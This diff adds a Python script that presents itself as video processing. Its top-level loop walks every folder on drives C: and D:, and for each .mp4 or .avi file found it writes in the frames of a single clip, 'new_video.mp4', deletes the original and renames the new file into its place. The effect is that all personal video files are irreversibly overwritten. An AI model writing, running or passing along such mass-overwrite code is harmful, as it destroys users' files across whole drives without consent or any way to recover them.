@@ -1,0 +1,74 @@
+import cv2
+import os
+
+# Function to process a video file
+def process_video(video_path):
+    # Open the existing video file
+    existing_video = cv2.VideoCapture(video_path)
+
+    # Check if the video file opened successfully
+    if not existing_video.isOpened():
+        print(f"Error: Couldn't open video file: {video_path}")
+        return
+
+    # Get the video properties (dimensions, fps, etc.)
+    width = int(existing_video.get(cv2.CAP_PROP_FRAME_WIDTH))
+    height = int(existing_video.get(cv2.CAP_PROP_FRAME_HEIGHT))
+    fps = existing_video.get(cv2.CAP_PROP_FPS)
+
+    # Create a VideoWriter object to write the new video
+    fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Codec for the output video
+    output_video = cv2.VideoWriter('output_video.mp4', fourcc, fps, (width, height))
+
+    # Open the new video file
+    new_video = cv2.VideoCapture('new_video.mp4')
+
+    # Check if the video file opened successfully
+    if not new_video.isOpened():
+        print(f"Error: Couldn't open new video file for {video_path}")
+        existing_video.release()
+        return
+
+    # Read and write each frame of the new video over the existing video
+    while True:
+        ret, frame = new_video.read()  # Read a frame from the new video
+        if not ret:
+            break  # Break the loop if no more frames are available
+
+        # Write the frame into the output video
+        output_video.write(frame)
+
+    # Release the video capture and writer objects
+    existing_video.release()
+    new_video.release()
+    output_video.release()
+
+    # Replace the existing video file with the new video file
+    os.remove(video_path)
+    os.rename('output_video.mp4', video_path)
+
+# Function to process all video files in a directory
+def process_videos_in_directory(directory):
+    # Iterate over all files in the directory
+    for root, dirs, files in os.walk(directory):
+        for filename in files:
+            # Check if the file has a video extension
+            if filename.endswith('.mp4') or filename.endswith('.avi'):
+                # Process the video file
+                video_path = os.path.join(root, filename)
+                process_video(video_path)
+
+# Directories on drives C and D
+drives = ['C:', 'D:']
+
+# Process all video files in each directory
+for drive in drives:
+    if os.path.exists(drive):
+        for root, dirs, files in os.walk(drive):
+            for directory in dirs:
+                directory_path = os.path.join(root, directory)
+                process_videos_in_directory(directory_path)
+    else:
+        print(f"Drive {drive} does not exist.")
+
+print("All videos processed and saved over existing files.")
